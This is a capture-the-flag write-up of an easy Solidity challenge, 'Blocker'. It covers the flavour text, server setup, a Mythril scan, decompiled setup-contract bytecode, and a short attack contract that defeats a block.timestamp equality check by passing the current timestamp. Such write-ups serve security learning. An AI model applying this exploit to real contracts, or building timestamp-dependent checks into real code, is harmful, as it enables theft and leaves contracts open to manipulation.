---
Category:
  - Blockchain
Difficulty: Easy
Platform: X-MAS
Status: 1. In progress
tags: [Blockchain]
---

>[!quote]
>As the writer sat at her desk, staring at the blank page in front of her, an image began to take shape in her mind. She saw Santa Claus standing before a huge bronze door, carved into the side of a mountain. The door was adorned with intricate designs and symbols, and Santa seemed to be studying them intently. 
>
>As the writer watched, Santa reached out and touched one of the symbols, causing the door to swing open with a creaky groan. Without hesitation, Santa stepped through the opening and disappeared from view. 
>
>Intrigued by this vision, the writer began to piece together a story in her mind. She imagined that Santa had been sent on a quest by the elves, who had discovered a mysterious power hidden deep within the mountain. They believed that this power could be used to help save Christmas, but only if it was wielded by someone pure of heart and strong of spirit - someone like Santa.  
>
>As the story unfolded, the writer imagined Santa navigating through a series of challenges and obstacles as he made his way deeper into the mountain, searching for the source of the mysterious power. Along the way, he encountered all manner of strange creatures and magical beings, each one testing his resolve and determination. 
>
>Finally, after what seemed like an eternity, Santa reached the end of his journey and stood before the source of the power - a glowing, crystalline orb that pulsed with energy. As he reached out to touch it, the orb erupted with a burst of light, filling the mountain with a warm, golden glow.  
>
>With the power now at his fingertips, Santa knew that he had the means to save Christmas. And with a smile on his face and a twinkle in his eye, he turned and made his way back out of the mountain, ready to spread joy and happiness to all the children of the world.

# Setup

```bash
┌──(kali㉿kali)-[~/CTFs/X-MAS/Blocker]
└─$ nc challs.htsp.ro 9000
1 - launch new instance
2 - kill instance
3 - get flag
action? 1
your private blockchain has been deployed
it will automatically terminate in 30 minutes
here's some useful information
uuid:           faf495e7-7f54-462f-8333-79dcfe28c958
rpc endpoint:   http://challs.htsp.ro:9001/faf495e7-7f54-462f-8333-79dcfe28c958
private key:    0x571504963ccc37e9b7557d713b922c91683b00a16edff29105b460659edb0a40
setup contract: 0x970Fb1a0C3AA53AE348163f514F6fB1418b6672d
```

# Information Gathering

## Source code review

```c
$ cat Blocker.sol
// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.17;

contract Blocker {

    bool public solved = false;
    uint256 public current_timestamp;

    function _getPreviousTimestamp() internal returns (uint256) {
        current_timestamp = block.timestamp;
        return block.timestamp;
    }

    function solve(uint256 _guess) public {
        require(_guess == _getPreviousTimestamp());
        solved = true;
    }
} 
```

```bash
┌──(kali㉿kali)-[~/CTFs/X-MAS/Blocker]
└─$ sudo docker run -v $(pwd):/tmp mythril/myth analyze /tmp/Blocker.sol
==== Dependence on predictable environment variable ====
SWC ID: 116
Severity: Low
Contract: Blocker
Function name: solve(uint256)
PC address: 195
Estimated Gas Usage: 5476 - 25571
A control flow decision is made based on The block.timestamp environment variable.
The block.timestamp environment variable is used to determine a control flow decision. Note that the values of variables like coinbase, gaslimit, block number and timestamp are predictable and can be manipulated by a malicious miner. Also keep in mind that attackers know hashes of earlier blocks. Don't use any of those environment variables as sources of randomness and be aware that use of these variables introduces a certain level of trust into miners.
--------------------
In file: /tmp/Blocker.sol:16

require(_guess == _getPreviousTimestamp())

--------------------
Initial State:

Account: [CREATOR], balance: 0x3, nonce:0, storage:{}
Account: [ATTACKER], balance: 0x0, nonce:0, storage:{}

Transaction Sequence:

Caller: [CREATOR], calldata: , decoded_data: , value: 0x0
Caller: [SOMEGUY], function: solve(uint256), txdata: 0xb8b8d35a0000000000000000000000000000000000000000000000000000000000000000, decoded_data: (0,), value: 0x0
```

## Dumped and decompiled the setup contract

```bash
$ curl -X POST -H "Content-Type: application/json" --data '{"jsonrpc":"2.0","method":"eth_getCode","params":["0x449438AADDd972b602AF87620A08f2695Ce89dF9", "latest"],"id":1}' http://challs.htsp.ro:9001/a4e4e38b-28a9-4545-a53a-ab7f2c814cbf {"jsonrpc":"2.0","id":1,"result":"0x608060405234801561001057600080fd5b50600436106100365760003560e01c806364d98f6e1461003b578063be0ba8d214610058575b600080fd5b610043610083565b60405190151581526020015b60405180910390f35b60005461006b906001600160a01b031681565b6040516001600160a01b03909116815260200161004f565b60008060009054906101000a90046001600160a01b03166001600160a01b031663799320bb6040518163ffffffff1660e01b8152600401602060405180830381865afa1580156100d7573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906100fb9190610100565b905090565b60006020828403121561011257600080fd5b8151801515811461012257600080fd5b939250505056fea264697066735822122080dc49e5806f8d3590ff266a78a4c62f713c9f01ca443509d2af8967e9a2a1df64736f6c63430008110033"}
```

Decompile the bytecode using [ethervm.io](https://ethervm.io/decompile):

```c
contract Contract {
    function main() {
        memory[0x40:0x60] = 0x80;
        var var0 = msg.value;
    
        if (var0) { revert(memory[0x00:0x00]); }
    
        if (msg.data.length < 0x04) { revert(memory[0x00:0x00]); }
    
        var0 = msg.data[0x00:0x20] >> 0xe0;
    
        if (var0 == 0x64d98f6e) {
            // Dispatch table entry for isSolved()
            var var1 = 0x0043;
            var1 = isSolved();
            var temp0 = memory[0x40:0x60];
            memory[temp0:temp0 + 0x20] = !!var1;
            var1 = temp0 + 0x20;
        
        label_004F:
            var temp1 = memory[0x40:0x60];
            return memory[temp1:temp1 + var1 - temp1];
        } else if (var0 == 0xbe0ba8d2) {
            // Dispatch table entry for 0xbe0ba8d2 (unknown)
            var1 = 0x006b;
            var var2 = storage[0x00] & (0x01 << 0xa0) - 0x01;
            var temp2 = memory[0x40:0x60];
            memory[temp2:temp2 + 0x20] = var2 & (0x01 << 0xa0) - 0x01;
            var2 = temp2 + 0x20;
            goto label_004F;
        } else { revert(memory[0x00:0x00]); }
    }
    
    function isSolved() returns (var r0) {
        var var0 = 0x00;
        var var1 = storage[var0] & (0x01 << 0xa0) - 0x01 & (0x01 << 0xa0) - 0x01;
        var var2 = 0x799320bb;
        var temp0 = memory[0x40:0x60];
        memory[temp0:temp0 + 0x20] = (var2 & 0xffffffff) << 0xe0;
        var var3 = temp0 + 0x04;
        var temp1 = memory[0x40:0x60];
        var temp2;
        temp2, memory[temp1:temp1 + 0x20] = address(var1).staticcall.gas(msg.gas)(memory[temp1:temp1 + var3 - temp1]);
        var var4 = !temp2;
    
        if (!var4) {
            var temp3 = memory[0x40:0x60];
            var temp4 = returndata.length;
            memory[0x40:0x60] = temp3 + (temp4 + 0x1f & ~0x1f);
            var1 = 0x00fb;
            var3 = temp3;
            var2 = var3 + temp4;
            return func_0100(var2, var3);
        } else {
            var temp5 = returndata.length;
            memory[0x00:0x00 + temp5] = returndata[0x00:0x00 + temp5];
            revert(memory[0x00:0x00 + returndata.length]);
        }
    }
    
    function func_0100(var arg0, var arg1) returns (var r0) {
        var var0 = 0x00;
    
        if (arg0 - arg1 i< 0x20) { revert(memory[0x00:0x00]); }
    
        var temp0 = memory[arg1:arg1 + 0x20];
        var var1 = temp0;
    
        if (var1 == !!var1) { return var1; }
        else { revert(memory[0x00:0x00]); }
    }
}
```

Decompiled source code using JEB:

![](../../zzz_res/attachments/Pasted%20image%2020221220224102.png)

![](../../zzz_res/attachments/Pasted%20image%2020221220224120.png)

![](../../zzz_res/attachments/Pasted%20image%2020221220224135.png)

![](../../zzz_res/attachments/Pasted%20image%2020221220224153.png)


# Exploitation

## Block Timestamp Manipulation

>[!bug]
>https://medium.com/hackernoon/hackpedia-16-solidity-hacks-vulnerabilities-their-fixes-and-real-world-examples-f3210eba5148

Exploit:
```c
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import "hardhat/console.sol";

contract Blocker {

    bool public solved = false;
    uint256 public current_timestamp;

    function _getPreviousTimestamp() internal returns (uint256) {  
        current_timestamp = block.timestamp;
        console.log(current_timestamp);
        console.log(block.timestamp);
        return block.timestamp;
    }
    
    function solve(uint256 _guess) public {
        console.log(_guess);
        require(_guess == _getPreviousTimestamp());
        solved = true;
    }
}

contract attack {
    
    function sendTimestamp() public {
        address addy = 0xbDa488A1043d89bEaC205c9628938ae57B9eC2f5;
        Blocker blk = Blocker(addy);
        console.log(block.timestamp);
        blk.solve(block.timestamp);
    } 

}
```


# Flag

>[!success]
> `Th1s_15_th3_fl4g`


